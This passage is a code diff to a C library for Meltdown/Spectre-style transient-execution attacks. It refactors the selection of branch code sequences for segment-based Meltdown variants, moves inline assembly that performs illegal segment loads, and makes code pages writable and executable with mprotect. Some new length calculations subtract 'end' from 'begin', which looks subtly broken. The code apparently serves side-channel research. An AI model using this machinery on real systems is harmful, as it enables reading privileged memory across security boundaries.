+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_null_end - (size_t)branch_meltdown_segment_ss_null_begin);
 		break;
 		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_DS_PRIVILEGE_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_privilege_begin - (size_t)branch_meltdown_segment_ds_privilege_end);
 		break;
 		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_SS_PRIVILEGE_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ss_privilege_begin - (size_t)branch_meltdown_segment_ss_privilege_end);
 		break;
 		case MELTDOWN_SEGMENT_DS_RO:
-		to_addr = base_addr + BRANCH_MELTDOWN_SEGMENT_DS_WRITE_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_segment_ds_write_begin - (size_t)branch_meltdown_segment_ds_write_end);
 		break;
 		default:
 		break;
@@ -2300,11 +1851,11 @@ void libkdump_insert_speculative_instruction(int code_type, int number, void *co
 
 	if ((number % 2) == 1) {
 		step_size = ADD_INST_LEN;
-		from_addr = (size_t)dummy_branch_meltdown_segment_ds + ADD_INST_ADDR_OFFSET;
+		from_addr = (size_t)branch_meltdown_standard_end;
 	}
 	else {
 		step_size = SUB_INST_LEN;
-		from_addr = (size_t)dummy_branch_meltdown_segment_ds + SUB_INST_ADDR_OFFSET;
+		from_addr = (size_t)branch_meltdown_standard_end + ADD_INST_LEN;
 	}
 
 	to_addr += (number+1)/2 * ADD_INST_LEN + number/2 * SUB_INST_LEN - COVERT_CHANNEL_INST_LEN;
@@ -2323,47 +1874,43 @@ void libkdump_select_branch_code_sequence(int type, void *code_seq_addr) {
 	size_t base_addr, code_len;
 	switch (type) {
 		case MELTDOWN_SEGMENT_STANDARD:
-		base_addr = (size_t)dummy_branch_meltdown_segment_standard + BRANCH_MELTDOWN_SEGMENT_STANDARD_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_STANDARD_LEN;
+		base_addr = (size_t)branch_meltdown_standard_begin;
+		code_len = (size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS:
 		case MELTDOWN_SEGMENT_DS_NP:
 		case MELTDOWN_SEGMENT_CS_XO:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ds + BRANCH_MELTDOWN_SEGMENT_DS_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_DS_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ds_begin;
+		code_len = (size_t)branch_meltdown_segment_ds_end - (size_t)branch_meltdown_segment_ds_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS_NULL:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ds_null + BRANCH_MELTDOWN_SEGMENT_DS_NULL_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_DS_NULL_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ds_null_begin;
+		code_len = (size_t)branch_meltdown_segment_ds_null_end - (size_t)branch_meltdown_segment_ds_null_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ss + BRANCH_MELTDOWN_SEGMENT_SS_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_SS_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ss_begin;
+		code_len = (size_t)branch_meltdown_segment_ss_end - (size_t)branch_meltdown_segment_ss_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_RO:
 		case MELTDOWN_SEGMENT_SS_NP:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ss_np + BRANCH_MELTDOWN_SEGMENT_SS_NP_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_SS_NP_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ss_np_begin;
+		code_len = (size_t)branch_meltdown_segment_ss_np_end - (size_t)branch_meltdown_segment_ss_np_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_NULL:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ss_null + BRANCH_MELTDOWN_SEGMENT_SS_NULL_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_SS_NULL_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ss_null_begin;
+		code_len = (size_t)branch_meltdown_segment_ss_null_end - (size_t)branch_meltdown_segment_ss_null_begin;
 		break;
-		// case MELTDOWN_SEGMENT_CS_XO:
-		// base_addr = (size_t)dummy_meltdown_segment_cs + MELTDOWN_SEGMENT_CS_ADDR_OFFSET;
-		// code_len = MELTDOWN_SEGMENT_CS_LEN;
-		// break;
 		case MELTDOWN_SEGMENT_DS_PRIVILEGE:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ds_privilege + BRANCH_MELTDOWN_SEGMENT_DS_PRIVILEGE_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_DS_PRIVILEGE_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ds_privilege_begin;
+		code_len = (size_t)branch_meltdown_segment_ds_privilege_end - (size_t)branch_meltdown_segment_ds_privilege_begin;
 		break;
 		case MELTDOWN_SEGMENT_SS_PRIVILEGE:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ss_privilege + BRANCH_MELTDOWN_SEGMENT_SS_PRIVILEGE_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_SS_PRIVILEGE_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ss_privilege_begin;
+		code_len = (size_t)branch_meltdown_segment_ss_privilege_end - (size_t)branch_meltdown_segment_ss_privilege_begin;
 		break;
 		case MELTDOWN_SEGMENT_DS_RO:
-		base_addr = (size_t)dummy_branch_meltdown_segment_ds_write+ BRANCH_MELTDOWN_SEGMENT_DS_WRITE_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_SEGMENT_DS_WRITE_LEN;
+		base_addr = (size_t)branch_meltdown_segment_ds_write_begin;
+		code_len = (size_t)branch_meltdown_segment_ds_write_end - (size_t)branch_meltdown_segment_ds_write_begin;
 		break;
 		default:
 		break;
@@ -2384,7 +1931,8 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 	int count[3] = {0, 0, 0};
 
 	if (code_seq_addr != NULL) {
-		*code_seq_addr = (size_t)&&BRANCH_CODE_SEQUENCE;
+		extern const char BRANCH_CODE_SEQUENCE[];
+		*code_seq_addr = (size_t)BRANCH_CODE_SEQUENCE;
 		return -1;
 	}
 
@@ -2485,7 +2033,6 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 
 		// option 2: exception after exception
 		if (!setjmp(buf)) {
-			BRANCH_CODE_SEQUENCE:
 			__asm__ volatile (
 			// "mov %3, %%edx\n\t"
 			// // "clflush (%%edx)\n\t"
@@ -2506,7 +2053,8 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 				// "movl %%es:(%%eax), %%eax\n\t"
 				// "movl %%es:(%%eax), %%eax\n\t"
 				"movl %%es:(%%eax), %%eax\n\t" // last movq is illegal
-				"TO_ADDR: movl (%%ecx), %%ecx\n\t"
+				"BRANCH_CODE_SEQUENCE:\n\t"
+				"TO_ADDR: movl %%es:(%%ecx), %%ecx\n\t"
 				"add $1, %%ecx\n\t"
 				"sub $1, %%ecx\n\t"
 				"add $1, %%ecx\n\t"
@@ -2911,8 +2459,7 @@ int libkdump_spectre_read(size_t training_x, size_t malicious_x, int score[2],
 	legal = training_x;
 	size_t code_seq_addr = 0;
 	readMemoryByte(0, 0, 0, 0, 0, 0, 0, 0, &code_seq_addr);
-	code_seq_addr += BRANCH_CODE_SEQ_OFFSET;
-	// printf("code_seq_addr: 0x%lx\n", code_seq_addr);
+	printf("code_seq_addr: 0x%x\n", code_seq_addr);
 	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
 	// should fix this function (a new function copying new instruction sequences, other than framework #1)
 	libkdump_select_branch_code_sequence(code_type, (void *)code_seq_addr);
